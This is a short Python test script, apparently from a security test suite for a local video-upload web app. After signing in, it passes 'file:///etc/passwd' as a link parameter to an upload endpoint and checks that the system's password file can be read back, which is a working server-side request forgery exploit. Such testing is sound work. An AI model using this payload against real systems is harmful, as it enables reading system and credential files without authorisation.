import requests

def test_1_ssrf():
    params = {'username':'new', 'password':'new'}
    page = requests.get('https://localhost/python/signin.py', params=params, verify=False)
    page.encoding = 'utf-8'
    cookiename = page.text.strip().split(';')[0].split('=')[0]
    cookievalue = page.text.strip().split(';')[0].split('=')[1]
    cookies = {cookiename: cookievalue}
    params = {'fileinlink':'file:///etc/passwd', 'videoname':'passwords', 'filein':' '}
    page = requests.get('https://localhost/python/upload.py', params=params, cookies=cookies, verify=False)
    page = requests.get('https://localhost/videos/new_passwords', cookies=cookies, verify=False)
    assert 'root' in page.text
